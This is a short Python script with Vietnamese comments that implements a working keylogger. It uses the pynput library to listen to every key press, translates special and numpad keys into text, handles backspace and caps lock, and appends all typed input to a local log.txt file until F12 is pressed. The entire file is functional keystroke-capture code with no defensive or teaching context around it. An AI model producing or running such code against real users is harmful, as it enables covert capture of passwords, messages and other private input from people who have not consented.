from pynput.keyboard import Listener
import os

# * Khởi tạo biến capslock
capslock = 0

def anonymous(key):
    # * Dữ liệu nhập vào
    key = str(key)
    key = key.replace("'", "")
    
    # * Chương trình sẽ tắt khi gõ phím F12
    if key == "Key.f12":
        raise SystemExit(0)
    
    # * Khai báo capslock là biến toàn cục
    global capslock
    # * Nếu capslock = 2 đặt capslock về bằng 0 (xem dòng 60, 61)
    if capslock == 2:
        capslock = 0
    
    # * Bàn phím bên trái:
    if key == "Key.esc":
        key = " esc\n "
    if key == "Key.f1":
        key = ""
    if key == "Key.f2":
        key = ""
    if key == "Key.f3":
        key = ""
    if key == "Key.f4":
        key = ""
    if key == "Key.f5":
        key = ""
    if key == "Key.f6":
        key = ""
    if key == "Key.f7":
        key = ""
    if key == "Key.f8":
        key = ""
    if key == "Key.f9":
        key = ""
    if key == "Key.f10":
        key = ""
    if key == "Key.f11":
        key = ""
    if key == "Key.insert":
        key = ""
    if key == "Key.delete":
        key = " delete\n "
    if key == "[`]":
        key = "`"
    
    # * Khi gõ backspace thì sẽ xóa một ký tự trong file log.txt
    if key == "Key.backspace":
        key = ""
        with open("log.txt", 'rb+') as file:
            file.seek(-1, os.SEEK_END)
            file.truncate()
    
    if key == "Key.tab":
        key = " tab\n "
    
    # * Khi nhấn caps_lock thì sẽ tăng giá trị biến capslock
    if key == "Key.caps_lock":
        capslock = capslock + 1
        key = ""
    
    if key == "Key.enter":
        key = " enter\n "
    if key == "Key.shift" or key == "Key.shift_r":
        key = ""
    if key == "Key.ctrl_l" or key == "Key.ctrl_r":
        key = ""
    if key == "Key.alt_l" or key == "Key.alt_gr":
        key = ""
    if key == "Key.cmd":
        key = ""
    if key == "Key.up":
        key = " up "
    if key == "Key.down":
        key = " down "
    if key == "Key.left":
        key = " left "
    if key == "Key.right":
        key = " right " 
    if key == "Key.page_up":
        key = ""
    if key == "Key.page_down":
        key = ""
    if key == "Key.menu":
        key = ""
    if key == "Key.space":
        key = " "

    # * Bàn phím bên phải:
    if key == "<96>":
        key = "0"
    if key == "<97>":
        key = "1"
    if key == "<98>":
        key = "2"
    if key == "<99>":
        key = "3"
    if key == "<100>":
        key = "4"
    if key == "<101>":
        key = "5"
    if key == "<102>":
        key = "6"
    if key == "<103>":
        key = "7"
    if key == "<104>":
        key = "8"
    if key == "<105>":
        key = "9"
    if key == "<110>":
        key = "."
    if key == "Key.num_lock":
        key = ""

    # * Hàm chuyển đổi khi capslock đang bật
    if capslock == 1:
        key = key.upper()

    # * Chỉnh sửa phần này thành file muốn in ra
    with open("log.txt", "a") as file:
        file.write(key)

with Listener(on_press = anonymous) as listener:
    listener.join()
